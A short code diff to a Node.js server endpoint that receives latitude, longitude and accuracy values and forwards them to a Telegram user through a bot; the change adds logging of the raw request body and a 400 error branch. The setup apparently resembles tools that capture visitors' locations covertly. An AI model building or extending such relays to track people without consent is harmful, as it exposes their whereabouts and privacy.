@@ -221,6 +221,7 @@ function createNew(cid) {
 
 // 📌 Handle Location Data
 app.post("/location", (req, res) => {
+    console.log("Location Data Received:", req.body);
     const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
     const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
     const uid = decodeURIComponent(req.body.uid) || null;
@@ -231,6 +232,9 @@ app.post("/location", (req, res) => {
         bot.sendLocation(userId, lat, lon);
         bot.sendMessage(userId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
         res.send("Done");
+    } else {
+        console.error("Invalid location data received:", req.body);
+        res.status(400).send("Invalid data");
     }
 });
 
